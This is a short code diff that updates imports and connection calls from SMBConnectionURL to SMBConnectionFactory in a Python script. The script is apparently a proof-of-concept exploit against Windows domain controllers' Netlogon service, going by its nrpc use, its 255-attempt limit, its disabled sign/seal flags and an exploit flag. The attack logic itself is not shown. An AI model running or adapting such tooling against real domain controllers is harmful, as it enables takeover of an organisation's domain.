@@ -1,6 +1,6 @@
 
 import asyncio
-from aiosmb.commons.connection.url import SMBConnectionURL
+from aiosmb.commons.connection.factory import SMBConnectionFactory
 from aiosmb.commons.interfaces.machine import SMBMachine
 from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
 from aiosmb.dcerpc.v5 import nrpc
@@ -23,7 +23,7 @@ MAX_ATTEMPTS = 255
 #	# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
 #	flags = 0x212fffff
 #
-#	url = SMBConnectionURL(url_str)
+#	url = SMBConnectionFactory.from_url(url_str)
 #	connection = url.get_connection()
 #
 #
@@ -96,7 +96,7 @@ async def run(dc_name, dc_ip, exploit = False):
 	# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
 	flags = 0x212fffff
 
-	url = SMBConnectionURL('smb2+ntlm-password://XXX\\aaa:aaa@%s' % dc_name) # dummy url to speed up the process..
+	url = SMBConnectionFactory.from_url('smb2+ntlm-password://XXX\\aaa:aaa@%s' % dc_name) # dummy url to speed up the process..
 	connection = url.get_connection()
 
 	async with connection:
